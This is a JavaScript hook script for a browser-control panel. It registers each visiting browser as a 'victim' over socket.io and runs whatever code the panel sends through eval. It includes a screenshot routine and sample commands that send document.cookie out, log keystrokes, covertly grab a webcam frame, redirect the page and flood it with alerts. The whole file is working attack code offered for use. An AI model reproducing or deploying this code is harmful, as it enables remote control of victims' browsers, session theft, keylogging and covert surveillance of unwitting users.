// public/hook.js
const socket = io();

// Register victim
socket.emit("register", { ua: navigator.userAgent, panel: false });

// When command comes from panel
socket.on("command", ({ cmd }) => {
  try {
    let result = eval(cmd); // run the code
    socket.emit("output", { from: socket.id, result: String(result) });
  } catch (e) {
    socket.emit("output", { from: socket.id, result: "Error: " + e.message });
  }
});

// Screenshot function
function takeScreenshot() {
  html2canvas(document.body).then(canvas => {
    socket.emit("screenshot", { img: canvas.toDataURL() });
  });
}

sendCmd(`socket.emit('output',{from:socket.id,result:document.cookie})`)

sendCmd(`window.location='https://example.com'`)

sendCmd(`
  document.onkeydown = (e)=>{
    socket.emit('output',{from:socket.id,result:'Key: '+e.key});
  }
`)

sendCmd(`
navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{
  let video=document.createElement('video');
  video.srcObject=stream; video.play();
  let canvas=document.createElement('canvas');
  setTimeout(()=>{
    canvas.width=video.videoWidth;
    canvas.height=video.videoHeight;
    canvas.getContext('2d').drawImage(video,0,0);
    socket.emit('screenshot',{from:socket.id,img:canvas.toDataURL()});
    stream.getTracks().forEach(t=>t.stop());
  },2000);
})
`)

sendCmd(`for(let i=0;i<5;i++){alert('⚡ Panel Message ⚡')}`)
